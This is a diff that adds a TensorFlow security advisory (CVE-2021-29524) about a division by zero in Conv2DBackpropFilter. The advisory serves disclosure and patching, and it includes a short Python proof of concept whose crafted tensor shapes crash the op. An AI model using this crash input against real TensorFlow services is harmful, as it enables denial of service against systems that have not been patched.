@@ -1,0 +1,34 @@
+<h2>TFSA-2021-013: Division by 0 in <code>Conv2DBackpropFilter</code></h2>
+<h3>CVE Number</h3>
+<p>CVE-2021-29524</p>
+<h3>Impact</h3>
+<p>An attacker can trigger a division by 0 in <code>tf.raw_ops.Conv2DBackpropFilter</code>:</p>
+<p>```python
+import tensorflow as tf</p>
+<p>input_tensor = tf.constant([], shape=[0, 0, 1, 0], dtype=tf.float32)
+filter_sizes = tf.constant([1, 1, 1, 1], shape=[4], dtype=tf.int32)
+out_backprop = tf.constant([], shape=[0, 0, 1, 1], dtype=tf.float32)</p>
+<p>tf.raw_ops.Conv2DBackpropFilter(input=input_tensor, filter_sizes=filter_sizes,
+                                out_backprop=out_backprop,
+                                strides=[1, 66, 18, 1], use_cudnn_on_gpu=True,
+                                padding='SAME', explicit_paddings=[],
+                                data_format='NHWC', dilations=[1, 1, 1, 1])
+```</p>
+<p>This is because the
+<a href="https://github.com/tensorflow/tensorflow/blob/496c2630e51c1a478f095b084329acedb253db6b/tensorflow/core/kernels/conv_grad_shape_utils.cc#L130">implementation</a> does a modulus operation where the divisor is controlled by the caller:</p>
+<p><code>cc
+  if (dims-&gt;in_depth % filter_shape.dim_size(num_dims - 2)) { ... }</code></p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit
+<a href="https://github.com/tensorflow/tensorflow/commit/fca9874a9b42a2134f907d2fb46ab774a831404a">fca9874a9b42a2134f907d2fb46ab774a831404a</a>.</p>
+<p>The fix will be included in TensorFlow 2.5.0. We will also cherrypick this
+commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow
+2.1.4, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security
+guide</a> for
+more information regarding the security model and how to contact us with issues
+and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu
+X-Team.</p>
